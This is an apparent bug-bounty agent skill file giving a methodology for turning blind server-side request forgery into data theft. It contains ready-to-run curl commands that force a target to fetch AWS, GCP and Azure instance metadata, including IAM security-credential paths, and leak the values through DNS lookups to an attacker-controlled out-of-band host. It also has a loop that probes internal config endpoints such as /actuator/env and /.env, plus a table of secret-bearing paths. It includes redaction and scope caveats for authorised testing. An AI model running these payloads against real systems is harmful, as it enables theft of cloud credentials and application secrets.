---
name: attack-ssrf-blind-harvest
description: "Blind SSRF → metadata & config harvesting — prove via OOB first, then extract cloud metadata, config endpoints, and internal state through DNS exfil and timing/content oracles"
category: "web-application"
version: "1.0"
author: "bountyreper-official"
tags:
  - ssrf
  - blind
  - metadata
  - config
  - oob
  - dns-exfil
tech_stack:
  - web
  - aws
  - gcp
  - azure
  - graphql
cwe_ids:
  - CWE-918
chains_with:
  - attack-ssrf
  - attack-ssrf-blind-oob
  - attack-ssrf-cloud-metadata
  - attack-ssrf-k8s-mesh
prerequisites:
  - attack-ssrf
---

# Blind SSRF → Metadata & Config Harvest

## Objective

The fetch happens but nothing comes back (blind). Prove the SSRF first, then turn the
blind primitive into DATA OUT: cloud instance metadata, app/service config endpoints,
and internal state — via DNS exfiltration, render-side reflection, or timing oracles.

Chain note: `attack-ssrf-blind-oob` covers PROOF (the hit log is the finding). This
sub-skill covers what you DO once the fetch is confirmed — extracting real data.

## Methodology

### 1. Prove the fetch (from blind-oob playbook — summary)

```bash
curl "https://TARGET/fetch?url=http://YOUR_OOB_HOST/probe-N"
# one hit per input point, unique tag → confirmed SSRF map
```

### 2. Metadata extraction, blind (DNS out-channel)

```bash
# IMDS values ride out through the DNS name you force the server to resolve
curl "https://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/hostname.<tag>.YOUR_OOB_HOST.net"
curl "https://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<tag>.YOUR_OOB_HOST.net"
curl "https://TARGET/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/hostname.<tag>.YOUR_OOB_HOST.net"
curl -H "Metadata: true" "https://TARGET/fetch?url=http://169.254.169.254/metadata/instance/compute/location.<tag>.YOUR_OOB_HOST.net"
# Each returned label in your DNS log = one exfiltrated internal value
```

### 3. Blind config endpoints (state to hunt for)

Any of these reached blind = config disclosure candidate → rank with the same table:

| Target | Why it matters blind |
|---|---|
| `/actuator/env`, `/actuator/configprops` (Spring) | secrets/db URLs in env |
| `/env` `/heapdump` (Spring ErrorPage) | heap = credentials |
| `/_nodes`, `/_cat/indices` (Elasticsearch 9200) | internal topology |
| `/server-info`, `/solr/admin/info/system` | build/version reveal |
| `/debug/pprof`, `/debug/vars` (Go) | runtime internals |
| `/.env`, `/config`, `/api/config`, `/application.properties` | direct config file |
| `/admin/config`, `/api/config/rest/appsettings` | app secrets |
| `/_debugbar`, `/profiler` (PHP) | config + env dump |
| `/druid/index.html` (Alibaba Druid) | datasource passwords |
| Redis `CONFIG GET *` via gopher | full instance config |

```bash
for path in /actuator/env /_env /debug/vars /.env /config /api/config; do
  curl -s -o /dev/null -w "$path %{http_code}\n" \
    "https://TARGET/fetch?url=http://127.0.0.1:8080$path"
done
```

### 4. Read data out blind (channel ladder)

1. **Render-reflect:** the internal response body sometimes lands in the app UI as an
   "image not found" error / form validation text — check EVERY response field
2. **DNS exfil:** bash/xxe-style string-building not available? then only values that
   appear in a hostname (hostname, instance-id) can ride out — encode them
3. **Timing/content-type oracle:** config endpoint reachable = faster response and
   different headers than a closed port; document the delta table
4. **Partial reflection:** some fetchers relay the internal HTTP STATUS (200 vs 404) —
   turn that into an endpoint TYPESCAN (exists / not-exists map)

### 5. From blind config read to real findings

- Metadata creds → validate OFF-TARGET (do not use inside the program), redact, report
- `.env`/actuator content → one shot per endpoint, capture secrets REDACTED
- Endpoint existence map → feed attack-ssrf-k8s-mesh for the port/service sweep

## Evidence bar

- EXACT OOB hit log line + triggering request for the metadata/config URL
- Exfiltrated values shown as `pattern` proofs, values REDACTED
- No "probably reachable" claims — oracle deltas only count with 3+ repeatable samples

## Notes

- Keeper rule: blind ≠ hopeless — every internal value that can pass through a
  hostname or a status byte is extractable; think in channels, not payloads
